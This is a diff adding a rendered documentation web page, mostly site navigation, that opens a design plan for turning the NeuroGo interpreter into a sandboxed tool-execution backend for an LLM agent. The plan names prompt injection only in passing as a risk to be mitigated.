+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NeuroData/map_schema/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Map Schema
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NeuroData/patch/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Patch
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NeuroData/references/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    References
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NeuroData/symbolic_math/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Symbolic Math
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NeuroData/table/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Table
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NeuroData/templates/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Templates
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NeuroData/tree/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Tree
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Tools
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            Tools
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Index
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/delete_api_file/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    delete_api_file
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/fs_deletefile/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    fs_deletefile
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/fs_filehash/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    fs_filehash
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/fs_linecountfile/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    fs_linecountfile
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/fs_mkdir/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    fs_mkdir
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/fs_movefile/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    fs_movefile
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/fs_readfile/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    fs_readfile
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/fs_sanitizefilename/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    fs_sanitizefilename
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/fs_walkdir/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    fs_walkdir
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/fs_writefile/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    fs_writefile
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/git_add/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    git_add
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/git_checkout/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    git_checkout
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/git_commit/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    git_commit
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/git_diff/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    git_diff
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/git_gitstatus/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    git_gitstatus
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/git_merge/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    git_merge
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/git_newbranch/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    git_newbranch
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/git_pull/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    git_pull
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/git_push/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    git_push
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/git_rm/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    git_rm
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/git_status/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    git_status
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/go_build/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    go_build
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/go_update_imports_for_moved_package/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    go_update_imports_for_moved_package
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/list_api_files/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    list_api_files
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/maths/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    maths
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/move_file/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    move_file
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/query_table/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    query_table
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/strings/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    strings
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/sync_files/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    sync_files
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/tool_spec_structure/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    tool_spec_structure
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/upload_file/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    upload_file
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/vector_searchskills/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    vector_searchskills
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ns/tools/vector_update/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    vector_update
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Status & Build
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            Status & Build
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../build/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Build Guide
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../completed/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Completed Checklist
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../release_checklist.ndcl/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Release Checklist
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      Introduction
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Introduction">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#purpose" class="md-nav__link">
+    <span class="md-ellipsis">
+      Purpose
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#concept-recap" class="md-nav__link">
+    <span class="md-ellipsis">
+      Concept Recap
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#criticality-of-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      Criticality of Security
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scope-and-structure" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scope and Structure
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-1-proposed-architecture-for-neurogo-as-llm-agent" class="md-nav__link">
+    <span class="md-ellipsis">
+      Section 1: Proposed Architecture for NeuroGo-as-llm-agent
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Section 1: Proposed Architecture for NeuroGo-as-llm-agent">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#11-architectural-overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      1.1. Architectural Overview
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#12-core-components" class="md-nav__link">
+    <span class="md-ellipsis">
+      1.2. Core Components
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#13-interaction-flow-detailed-cycle" class="md-nav__link">
+    <span class="md-ellipsis">
+      1.3. Interaction Flow (Detailed Cycle)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-2-llm-interaction-protocol-via-gemini-function-calling" class="md-nav__link">
+    <span class="md-ellipsis">
+      Section 2: LLM Interaction Protocol via Gemini Function Calling
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Section 2: LLM Interaction Protocol via Gemini Function Calling">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#21-primary-mechanism-gemini-api-function-calling" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.1. Primary Mechanism: Gemini API Function Calling
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#22-data-structures" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.2. Data Structures
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#23-handling-multipleparallel-tool-calls" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.3. Handling Multiple/Parallel Tool Calls
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#24-function-calling-mode-configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.4. Function Calling Mode Configuration
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#25-fallback-strategy-structured-data-in-chat" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.5. Fallback Strategy (Structured Data in Chat)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-3-implementation-plan-for-neurogo-modifications-go" class="md-nav__link">
+    <span class="md-ellipsis">
+      Section 3: Implementation Plan for NeuroGo Modifications (Go)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Section 3: Implementation Plan for NeuroGo Modifications (Go)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#31-llmgo-adaptations" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.1. llm.go Adaptations
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#32-conversation-state-management" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.2. Conversation State Management
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#33-secure-tool-dispatch-mechanism" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.3. Secure TOOL Dispatch Mechanism
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#34-tool-refactoring-for-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.4. TOOL Refactoring for Security
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#35-agent-mode-configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.5. Agent Mode Configuration
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-4-critical-security-design" class="md-nav__link">
+    <span class="md-ellipsis">
+      Section 4: Critical Security Design
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Section 4: Critical Security Design">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#41-tool-allowlisting" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.1. TOOL Allowlisting
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#42-strict-argument-validation-and-sanitization" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.2. Strict Argument Validation and Sanitization
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#43-mandatory-path-sandboxing" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.3. Mandatory Path Sandboxing
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#44-high-risk-tool-restrictiondisabling" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.4. High-Risk Tool Restriction/Disabling
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#45-inputoutput-filtering-defense-in-depth" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.5. Input/Output Filtering (Defense in Depth)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#46-security-measures-summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.6. Security Measures Summary
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-5-key-challenges-risks-and-mitigation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Section 5: Key Challenges, Risks, and Mitigation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Section 5: Key Challenges, Risks, and Mitigation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#51-security-vulnerabilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      5.1. Security Vulnerabilities
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#52-llm-reliability-issues" class="md-nav__link">
+    <span class="md-ellipsis">
+      5.2. LLM Reliability Issues
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#53-state-management-complexity" class="md-nav__link">
+    <span class="md-ellipsis">
+      5.3. State Management Complexity
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#54-performance-considerations" class="md-nav__link">
+    <span class="md-ellipsis">
+      5.4. Performance Considerations
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#55-riskchallenge-analysis-summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      5.5. Risk/Challenge Analysis Summary
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-6-phased-development-and-testing-milestones" class="md-nav__link">
+    <span class="md-ellipsis">
+      Section 6: Phased Development and Testing Milestones
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Section 6: Phased Development and Testing Milestones">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#61-phase-1-foundational-implementation-focus-core-loop-basic-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      6.1. Phase 1: Foundational Implementation (Focus: Core Loop &amp; Basic Security)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#62-phase-2-security-hardening-and-tool-expansion-focus-robustness-capability" class="md-nav__link">
+    <span class="md-ellipsis">
+      6.2. Phase 2: Security Hardening and Tool Expansion (Focus: Robustness &amp; Capability)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#63-phase-3-refinement-and-advanced-features-focus-usability-performance-testing" class="md-nav__link">
+    <span class="md-ellipsis">
+      6.3. Phase 3: Refinement and Advanced Features (Focus: Usability, Performance, Testing)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-7-alignment-with-neuroscript-bootstrapping-goal" class="md-nav__link">
+    <span class="md-ellipsis">
+      Section 7: Alignment with NeuroScript Bootstrapping Goal
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Section 7: Alignment with NeuroScript Bootstrapping Goal">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#71-enabling-self-development-tasks" class="md-nav__link">
+    <span class="md-ellipsis">
+      7.1. Enabling Self-Development Tasks
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#72-secure-orchestration-layer" class="md-nav__link">
+    <span class="md-ellipsis">
+      7.2. Secure Orchestration Layer
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#73-accelerating-the-bootstrapping-roadmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      7.3. Accelerating the Bootstrapping Roadmap
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Conclusion
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Conclusion">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#summary-of-plan" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary of Plan
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#emphasis-on-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      Emphasis on Security
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#next-steps" class="md-nav__link">
+    <span class="md-ellipsis">
+      Next Steps
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#section-8-gemini-25-discussion-llm-interaction-api-llm-neurogo-request" class="md-nav__link">
+    <span class="md-ellipsis">
+      Section 8: Gemini 2.5 Discussion: LLM Interaction API (LLM -&gt; NeuroGo Request)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-conversation-state-management" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Conversation State Management
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-security-limiting-actions" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Security &amp; Limiting Actions
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="plan-for-evolving-neurogo-into-a-secure-llm-agent">Plan for Evolving NeuroGo into a Secure LLM Agent<a class="headerlink" href="#plan-for-evolving-neurogo-into-a-secure-llm-agent" title="Permanent link">&para;</a></h1>
+<h2 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">&para;</a></h2>
+<h3 id="purpose">Purpose<a class="headerlink" href="#purpose" title="Permanent link">&para;</a></h3>
+<p>This document presents a comprehensive technical plan for transforming the existing NeuroGo interpreter into a secure Large Language Model (LLM) agent, designated NeuroGo-as-llm-agent. The primary objective is to enable an LLM, such as Google's Gemini, to interact safely and effectively with a user's local environment by requesting NeuroGo to execute specific, pre-approved TOOL functions.</p>
+<h3 id="concept-recap">Concept Recap<a class="headerlink" href="#concept-recap" title="Permanent link">&para;</a></h3>
+<p>The core concept underpinning NeuroGo-as-llm-agent involves leveraging NeuroGo not as a direct executor of potentially complex NeuroScript procedures generated by an LLM, but as a constrained, local, and secure execution engine for discrete TOOL functions requested by the LLM. This shifts the execution model: instead of NeuroGo interpreting full NeuroScript logic potentially influenced or generated by an LLM, it focuses on executing well-defined, atomic tool operations on behalf of the LLM. The LLM handles the higher-level reasoning, planning, and task decomposition, while NeuroGo provides the secure interface to the local environment through its toolset, primarily utilizing the LLM's native function calling capabilities for communication. It's important to note that these agent capabilities are designed as an addition to NeuroGo's existing role as a NeuroScript interpreter, augmenting its functionality rather than replacing it.</p>
+<h3 id="criticality-of-security">Criticality of Security<a class="headerlink" href="#criticality-of-security" title="Permanent link">&para;</a></h3>
+<p>Security is the paramount design principle throughout this plan. Granting LLM agents, which are susceptible to manipulation techniques like prompt injection 1, the ability to interact with local system resources introduces significant risks. These include unauthorized data access or modification, execution of malicious commands, and system disruption.3 Key threats such as prompt injection 1 and insecure tool execution leading to excessive agency 3 must be rigorously addressed through architectural choices, strict validation, and layered security controls. The plan prioritizes establishing robust defenses against these and other vulnerabilities inherent in LLM-driven tool use.</p>
+<h3 id="scope-and-structure">Scope and Structure<a class="headerlink" href="#scope-and-structure" title="Permanent link">&para;</a></h3>
+<p>This plan encompasses the proposed architecture, the LLM interaction protocol (with a focus on Gemini Function Calling), detailed implementation steps within the NeuroGo Go codebase, a critical security design, analysis of key challenges and risks with mitigation strategies, phased development milestones, and an examination of how this capability aligns with the broader NeuroScript project goals. The subsequent sections detail each of these aspects.</p>
+<h2 id="section-1-proposed-architecture-for-neurogo-as-llm-agent">Section 1: Proposed Architecture for NeuroGo-as-llm-agent<a class="headerlink" href="#section-1-proposed-architecture-for-neurogo-as-llm-agent" title="Permanent link">&para;</a></h2>
+<h3 id="11-architectural-overview">1.1. Architectural Overview<a class="headerlink" href="#11-architectural-overview" title="Permanent link">&para;</a></h3>
+<p>The proposed architecture positions NeuroGo as a specialized, secure "Tool Execution Backend" orchestrated by an external LLM. The interaction flow follows a controlled cycle: User -&gt; LLM (e.g., Gemini) -&gt; NeuroGo Agent -&gt; Secure Tool Execution -&gt; LLM -&gt; User. The LLM is responsible for natural language understanding, reasoning, planning the sequence of actions, and deciding which NeuroGo TOOL function needs to be invoked to accomplish a sub-task.6 NeuroGo, operating in agent mode, receives these requests, validates them against stringent security policies, executes the permitted tools within a sandboxed context, and returns the results to the LLM for synthesis into a final user response or further planning.</p>
+<p>This architecture aligns with several established patterns for building agentic systems:</p>
+<ul>
+<li>Augmented LLM 8: The system's core is the external LLM, augmented with the specialized capabilities provided by the NeuroGo toolset. NeuroGo acts as the secure execution layer for these augmentations.</li>
+<li>LLM + Tools + Memory 9: This pattern is directly applicable. The LLM provides the reasoning, NeuroGo implements the secure "Tools" execution layer, and NeuroGo itself must incorporate "Memory" management for conversation history and security context across interaction turns.</li>
+<li>Tool Use Pattern 10: The design explicitly follows this pattern, equipping the LLM with external functionalities (local system interaction) mediated by NeuroGo's tools.</li>
+<li>ReAct Pattern Elements 6: The fundamental interaction loop mirrors elements of the Reason-Act (ReAct) pattern: the LLM reasons, requests an action (NeuroGo tool call), receives an observation (tool result), and reasons again. Initially, the planning complexity within the LLM might be simpler than full ReAct implementations, but the core cycle is present.</li>
+</ul>
+<p>A fundamental aspect of this architecture is the clear separation of concerns. LLMs, while powerful reasoning engines, are inherently difficult to fully secure against prompt manipulation.11 Granting them direct execution capabilities on a local machine represents an unacceptable level of risk, falling under the category of "Excessive Agency".3 This architecture mitigates that risk by using the LLM for its strengths (reasoning, natural language processing, planning) and delegating the sensitive execution phase to NeuroGo, which operates under strict, locally enforced security controls. This minimizes the attack surface directly exposed by potential LLM vulnerabilities.</p>
